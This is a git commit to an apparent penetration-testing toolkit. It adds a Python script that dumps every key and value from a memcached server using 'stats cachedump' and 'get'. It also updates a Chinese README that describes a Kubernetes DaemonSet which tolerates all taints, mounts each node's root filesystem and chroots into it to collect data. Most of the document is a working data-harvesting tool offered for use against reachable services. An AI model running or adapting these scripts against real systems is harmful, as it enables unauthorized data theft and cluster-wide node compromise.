cfd9b809bc618dd8e8feb51e734f0e03abda63ac
Em0tyset <809803763@qq.com>
2021-08-20 00:23:52 +0800

    add memcahced_info_gather

--- README.md
+++ README.md
@@ -1,6 +1,9 @@
 ##  kgather
-一组对kubernetes集群进行批量信息收集的脚本，帮助在kubernetes集群渗透中快速获取有用信息。
+一组对常见组件进行批量信息收集的脚本，在渗透过程中，快速获取有用信息。目前包括：
+1. kubernetes
+2. memcache
 
+### kubernetes
 k8s_nodes_info_gather：通过Deamonset对集群内所有node均创建一个挂载根目录的pod，通过chroot实现在node上的信息收集。过程如下：
 1. 获取所有node的基础信息
 2. 创建Daemonset，设置tolerations的key为空，operator为Exists，表示可以接受任意污点，这样Daemonset会在所有的node都创建一个pod，包括master，并且挂载node的根目录到pod中。
@@ -11,6 +14,12 @@ k8s_pods_info_gather：对集群内所有pod执行一组命令，进行信息收
 1. 获取所有pods
 2. 遍历对每个pod执行一组命令。
 
+### memcache
+
+memcached_info_gather：遍历获取memcached的数据
+1. 通过stats items获取所有的slabs和items
+2. 遍历slabs，通过stats cachedump {slab_id} {limit}获取key
+3. 遍历key获取value
 
 ## 使用
 对所有node执行信息收集：把kubectl和k8s_nodes_info_gather.py放置同一目录
@@ -24,3 +33,8 @@ python3 k8s_pods_info_gather.py
 ```
 
 需要自定义执行的命令的，可以修改脚本中的cmds。
+
+获取memcached所有数据
+```
+python memcached_info_gather.py -i {ip} -p {port} -l 0
+```
---
+++ memcached_info_gather.py
@@ -0,0 +1,100 @@
+# coding=utf-8
+# @Time: 2021/8/19
+# @Author:em0ty
+# 批量获取memcached数据
+
+import socket
+import argparse
+import time
+
+out_file = ""
+screen = ""
+
+def write(content):
+    if screen:
+        print(content)
+    with open(out_file,"a") as f:
+        f.write(content)
+
+
+def get_datas(client,end='END'):
+    datas = ''
+    while True:
+        tmp = client.recv(1024)
+        datas = datas + tmp.decode()
+        if datas.strip().endswith(end):
+            break
+    datas = datas.strip().split('\n')
+    return datas[:-1]
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--ip", help='ip，默认为127.0.0.1',default='127.0.0.1')
+    parser.add_argument("-p", "--port", help='端口，默认为11211', default=11211, type=int)
+    parser.add_argument("-l", "--limit", help='每个slab查询最大数据量，默认是100条，输入0代表获取全部', default=100, type=int)
+    parser.add_argument("-o", "--out", help='输出文件，默认为./{ip}_{port}_{time}.txt',default="")
+    parser.add_argument("-s", "--screen", help='结果同时输出到屏幕', action="store_true")
+    args = parser.parse_args()
+
+    ip = args.ip
+    port = args.port
+    limit = args.limit
+    out_file = args.out
+    screen = args.screen
+    if out_file == '':
+        out_file = time.strftime("{ip}_{port}_%Y-%m-%d_%H:%M:%S_podinfo_out.txt", time.localtime()).format(ip=ip,port=str(port))
+
+    print('[+] memcached连接地址：',ip,port)
+    # 请求超时
+    socket.setdefaulttimeout(5)
+    address = (ip,port)
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect(address)
+
+    # 获取版本
+    client.send('version\r\n'.encode())
+    version = client.recv(1024)
+    write('memcached版本：'+version.decode())
+
+    # 获取slabs和items数量
+    slbas_result = set()
+    client.send('stats items\r\n'.encode())
+    slbas = get_datas(client)
+
+    for slab in slbas:
+        item = slab.split(' ')
+        if item[1].strip().endswith('number'):
+            slab_id = item[1].split(':')[1].strip()
+            item_sum = item[2].strip()
+            slbas_result.add((slab_id,item_sum))
+    write('slab数量：{slab_sum}\n'.format(slab_sum=str(len(slbas_result))))
+
+    # 获取slab下的key
+    write("开始获取数据，每个slab最大获取数量：{limit}\n".format(limit=str(limit)))
+    for slab in slbas_result:
+        keys_result = []
+        slab_id = slab[0]
+        item_sum = slab[1]
+        write("slab_id：{slab_id}，item数量：{item_sum}\n".format(
+            slab_id=slab_id,item_sum=item_sum
+        ))
+        client.send('stats cachedump {slab_id} {limit}\r\n'.format(
+            slab_id=slab_id,limit=limit
+        ).encode())
+        tmp_keys = get_datas(client)
+        for tmp_key in tmp_keys:
+            keys_result.append(tmp_key.split(' ')[1])
+        for key in keys_result:
+            client.send('get {key}\r\n'.format(key=key).encode())
+            tmp_value = get_datas(client)
+            value = tmp_value[1].strip()
+            bit = tmp_value[0].strip().split(' ')[-1]
+            write("key: {key} 大小：{bit}字节\nvalue={value} \n\n\n\n".format(
+                key=key,bit=bit,value=value
+            ))
+        write('---------------slab split----------------')
+
+    # 退出
+    client.send('quit\r\n'.encode())
+    client.close()
+    print("收集完毕，结果输出到文件：",out_file)
